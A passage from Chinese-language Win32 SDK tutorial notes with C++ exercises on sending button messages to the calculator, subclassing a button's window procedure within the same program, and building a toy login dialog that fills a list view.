MAKEWPARAM(<span class="number">0x86</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1005</span>:<span class="comment">//数字5</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x87</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1006</span>:<span class="comment">//数字6</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x88</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1007</span>:<span class="comment">//数字7</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x89</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1008</span>:<span class="comment">//数字8</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x8A</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1009</span>:<span class="comment">//数字9</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x8B</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0011</span>:<span class="comment">//数字0</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x82</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0012</span>:<span class="comment">//小数点</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x54</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0013</span>:<span class="comment">//运算符 +</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x5D</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0014</span>:<span class="comment">//运算符 - </span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x5E</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0015</span>:<span class="comment">//运算符 *</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x5C</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0016</span>:<span class="comment">//运算符 /</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x5B</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0018</span>:<span class="comment">//运算符 =</span></span><br><span class="line">SendMessage(calc, WM_COMMAND, MAKEWPARAM(<span class="number">0x79</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, msg, wparam, lparam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：拦截控件消息"><a href="#题：拦截控件消息" class="headerlink" title="题：拦截控件消息"></a>题：拦截控件消息</h2><p>控件的窗口类，是系统自己注册的，所以，控件的消息处理函数，也是系统自己的。我们如果想要得到控件消息，就需要截获到控件的消息处理函数。</p><p>GetClassLong 能够获取一个已经注册的窗口的类中的属性</p><p>SetClassLong 能够设置一个窗口，对应的窗口类中的属性</p><p>示例：我们使用SetClassLong实现修改按钮的光标</p><h3 id="修改按钮的cursor属性"><a href="#修改按钮的cursor属性" class="headerlink" title="//修改按钮的cursor属性"></a>//修改按钮的cursor属性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HCURSOR hCursor = LoadCursor(g_hInstance, MAKEINTRESOURCE(IDC_CURSOR1));</span><br><span class="line">SetClassLong(hButton4, GCL_HCURSOR, (LONG)hCursor);</span><br></pre></td></tr></table></figure><h3 id="修改控件回调"><a href="#修改控件回调" class="headerlink" title="//修改控件回调"></a>//修改控件回调</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">// 旧的窗口回调，</span></span><br><span class="line">WNDPROC g_oldProc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">ButtonProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">MessageBox(<span class="number">0</span>, <span class="string">L&quot;你被hook了&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用默认的处理函数</span></span><br><span class="line"><span class="keyword">return</span> CallWindowProc(DefWindowProc, hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;按钮1&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1001</span>, GetModuleHandle(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;hook&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1002</span>, GetModuleHandle(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line">CreateWindow(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;unhook&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">70</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1003</span>, GetModuleHandle(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (LOWORD(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1001</span>:</span><br><span class="line">MessageBox(<span class="number">0</span>, <span class="string">L&quot;我是按钮&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1002</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取按钮1 的句柄</span></span><br><span class="line">HWND hButton1 = GetDlgItem(hWnd, <span class="number">0x1001</span>);</span><br><span class="line"><span class="comment">// 替换原本的消息回调</span></span><br><span class="line">g_oldProc =</span><br><span class="line">(WNDPROC)SetWindowLong(hButton1, GWL_WNDPROC, (LONG)ButtonProc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1003</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取按钮1 的句柄</span></span><br><span class="line">HWND hButton1 = GetDlgItem(hWnd, <span class="number">0x1001</span>);</span><br><span class="line"><span class="comment">// 替换原本的消息回调</span></span><br><span class="line">SetWindowLong(hButton1, GWL_WNDPROC, (LONG)g_oldProc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ <span class="keyword">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.注册窗口类</span></span><br><span class="line">WNDCLASS wc = &#123;&#125;;</span><br><span class="line"><span class="comment">// 窗口回调</span></span><br><span class="line">wc.lpfnWndProc = WndProc;</span><br><span class="line"><span class="comment">// 窗口类名</span></span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;myClass&quot;</span>;</span><br><span class="line">RegisterClass(&amp;wc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.创建窗口</span></span><br><span class="line">HWND hWnd = CreateWindow(<span class="string">L&quot;myClass&quot;</span>, <span class="string">L&quot;我的窗口&quot;</span>, WS_OVERLAPPEDWINDOW,</span><br><span class="line"><span class="number">40</span>, <span class="number">40</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.更新显示窗口</span></span><br><span class="line">UpdateWindow(hWnd);</span><br><span class="line">ShowWindow(hWnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.建立消息循环</span></span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：校园学生登录"><a href="#题：校园学生登录" class="headerlink" title="题：校园学生登录"></a>题：校园学生登录</h2><p>里面有图片控件是直接在可视化界面导入的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Commctrl.h&gt;//通用控件必备头</span></span></span><br><span class="line"><span class="comment">//全局的实例句柄</span></span><br><span class="line"><span class="keyword">static</span> HINSTANCE g_hInstance;</span><br><span class="line"><span class="comment">//全局的父窗口句柄</span></span><br><span class="line">HWND g_hDlg;</span><br><span class="line"><span class="comment">//非模态回调</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="comment">//手动回调</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndPorc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE lProInstance, LPSTR lpCmdLine, <span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hInstance = hInstance;</span><br><span class="line">HWND hDlg=CreateDialog(hInstance,MAKEINTRESOURCE(IDD_DIALOG1),<span class="literal">NULL</span>, DlgProc);</span><br><span class="line">g_hDlg = hDlg;</span><br><span class="line">ShowWindow(hDlg,SW_SHOW);</span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//回调</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd,UINT Message,WPARAM wParam,LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (Message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (LOWORD(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IDOK2:<span class="comment">//登录控件</span></span><br><span class="line">&#123;</span><br><span class="line">HWND hBt = GetDlgItem(hWnd, IDOK2);</span><br><span class="line"><span class="comment">//SendMessage(hBt, BM_GETCHECK,0,0);</span></span><br><span class="line"><span class="comment">//MessageBox(hBt,L&quot;无法连接服务器&quot;,L&quot;提示&quot;,1);</span></span><br><span class="line"><span class="comment">//获取文本框句柄</span></span><br><span class="line">HWND hedit_user = GetDlgItem(hWnd, IDC_EDIT3);</span><br><span class="line">HWND hedit_passwd = GetDlgItem(hWnd, IDC_EDIT2);</span><br><span class="line"><span class="comment">//定义文本框获取缓冲区</span></span><br><span class="line">WCHAR c_User[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">WCHAR c_Passwd[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//获取编辑框中是文本</span></span><br><span class="line">GetWindowText(hedit_user, c_User,<span class="number">20</span>);</span><br><span class="line">GetWindowText(hedit_passwd, c_Passwd, <span class="number">20</span>);</span><br><span class="line">WCHAR C_MAX[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//将用户名转换成char*用于使用strcmp函数的比较</span></span><br><span class="line"><span class="function"><span class="keyword">_bstr_t</span> <span class="title">c_UTemp</span><span class="params">(c_User)</span></span>;<span class="comment">//将WHCHAR* 转换位char*</span></span><br><span class="line"><span class="function"><span class="keyword">_bstr_t</span> <span class="title">c_PTemp</span><span class="params">(c_Passwd)</span></span>;<span class="comment">//将WHCHAR* 转换位char*</span></span><br><span class="line"><span class="comment">//设置一个可以登录的用户名或密码</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* u_temp = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* p_temp = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//int i = strcmp(c_UTemp, u_temp);</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">strcmp</span>(c_UTemp, u_temp)==<span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(c_PTemp, p_temp)==<span class="number">0</span>))<span class="comment">//等于0说明账户名和密码都相等，验证成功</span></span><br><span class="line">&#123;</span><br><span class="line">ShowWindow(hWnd,SW_HIDE);<span class="comment">//隐藏主窗口</span></span><br><span class="line"></span><br><span class="line">HWND hMain = CreateDialog(g_hInstance,MAKEINTRESOURCE(IDD_DIALOG2) ,g_hDlg, DlgProc);</span><br><span class="line"><span class="comment">//初始化界面</span></span><br><span class="line"><span class="comment">//1,初始化图片</span></span><br><span class="line">HBITMAP hBit_map = LoadBitmap(g_hInstance, MAKEINTRESOURCE(IDB_BITMAP1));</span><br><span class="line">HWND hPic=GetDlgItem(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line">SendMessage(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br><span class="line"><span class="comment">//2，初始化列表</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//1. 获取列表框的句柄</span></span><br><span class="line">HWND hListCtrl = GetDlgItem(hMain, IDC_LIST3);</span><br><span class="line">ListView_SetExtendedListViewStyle(hListCtrl, LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);</span><br><span class="line"><span class="comment">//添加第一列</span></span><br><span class="line">LVCOLUMN lv = &#123;&#125;;</span><br><span class="line">lv.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">lv.cx = <span class="number">112</span>;<span class="comment">//112正好对应该窗口的宽度为4列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;年份&quot;</span>);</span><br><span class="line">lv.fmt = LVCFMT_CENTER;</span><br><span class="line">ListView_InsertColumn(hListCtrl, <span class="number">0</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第二列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;时间&quot;</span>);</span><br><span class="line">ListView_InsertColumn(hListCtrl, <span class="number">1</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第三列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;经历&quot;</span>);</span><br><span class="line">ListView_InsertColumn(hListCtrl, <span class="number">2</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第四列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;备注&quot;</span>);</span><br><span class="line">ListView_InsertColumn(hListCtrl, <span class="number">3</span>, &amp;lv);</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">0</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2009&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line">ListView_InsertItem(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">0</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">0</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学附中就读&quot;</span>));</span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">0</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;班长一职&quot;</span>));</span><br><span class="line"><span class="comment">//添加第二行</span></span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">1</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2001&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line">ListView_InsertItem(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">1</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">1</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学&quot;</span>));</span><br><span class="line">ListView_SetItemText(hListCtrl, <span class="number">1</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;学生会主席&quot;</span>));</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ShowWindow(hMain, SW_SHOW);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">_stprintf_s(C_MAX, _T(<span class="string">&quot;账号或密码错误，请确认！\n\t账号：%s\n\t密码：%s&quot;</span>), c_User, c_Passwd);</span><br><span class="line">MessageBox(hWnd, C_MAX, <span class="string">L&quot;提示&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_NOTIFY:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1. 先获取小结构体中的信息，做大致判断</span></span><br><span class="line">LPNMHDR pNm = (LPNMHDR)lParam;</span><br><span class="line"><span class="keyword">if</span> (pNm-&gt;idFrom == IDC_LIST3 &amp;&amp; pNm-&gt;code == NM_CLICK)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_RBUTTONDOWN:</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//手动回调</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndPorc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, Message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、SDK详解"><a href="#三、SDK详解" class="headerlink" title="三、SDK详解"></a>三、SDK详解</h1><h2 id="常用字符串处理函数"><a href="#常用字符串处理函数" class="headerlink" 